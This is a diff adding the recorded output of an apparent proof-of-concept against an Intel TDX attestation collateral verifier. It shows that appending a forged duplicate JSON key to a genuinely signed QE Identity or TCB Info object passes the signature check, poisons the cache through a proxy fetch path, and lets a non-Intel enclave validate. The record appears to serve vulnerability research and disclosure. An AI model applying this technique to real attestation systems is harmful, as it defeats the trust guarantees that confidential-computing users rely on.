@@ -1,0 +1,29 @@
+QE Identity issuer chain (from genuine PCS header):
+   - C=US,ST=CA,L=Santa Clara,O=Intel Corporation,CN=Intel SGX TCB Signing
+   - C=US,ST=CA,L=Santa Clara,O=Intel Corporation,CN=Intel SGX Root CA
+
+[1] Baseline: genuine Intel QE Identity
+  [ACCEPTED] signature valid, mrsigner=dc9e2a7c6f948f17474e34a7fc43ed030f7c1563f1babddf6340c82e0e54a8c5
+
+[2] Control: in-place tampering of mrsigner is detected
+  [REJECTED] tampered body: CollateralError: QE Identity signature verification failed: signature does not match content
+
+[3] Attack: genuine signed object first, forged duplicate key appended
+  wire bytes: b'{"enclaveIdentity":{"id":"TD_QE","version":2,"issueDate":"20' b'...' b'414141414141","isvprodid":7,"tcbLevels":[{"tcb":{"isvsvn":0},"tcbDate":"2023-02-15T00:00:00Z","tcbStatus":"UpToDate"}]}}'
+  [ACCEPTED] signature check passed; identity actually used: mrsigner=4141414141414141414141414141414141414141414141414141414141414141 isvprodid=7 tcbEvalNum=99 nextUpdate=2099-01-01 00:00:00+00:00
+
+[4] Full production fetch path fetch_qe_identity() with a malicious proxy response
+  fetched from: https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/qe/identity?tcbEvaluationDataNumber=19
+  [ACCEPTED] fetch_qe_identity() returned mrsigner=4141414141414141414141414141414141414141414141414141414141414141
+  [ACCEPTED] cache hit (persistent poisoning) mrsigner=4141414141414141414141414141414141414141414141414141414141414141
+
+[5] Consequence: a QE report from a NON-Intel enclave passes validate_qe_identity
+  [REJECTED] with the genuine Intel QE Identity: CollateralError: QE report MRSIGNER does not match expected value. Got 41414141414141414141414141414141414141414141414141414141
+  [ACCEPTED] with the forged QE Identity (tcbStatus=UpToDate)
+
+[6] Same differential on TCB Info (fetch_tcb_info)
+  genuine tcbLevels statuses: ['OutOfDate', 'UpToDate']
+  fetched from: https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000&tcbEvaluationDataNumber=19
+  [ACCEPTED] fetch_tcb_info() returned tcbEvaluationDataNumber=99, levels=['UpToDate'], level0 svns all zero=True
+
+RESULT: forged collateral accepted with genuine Intel signatures
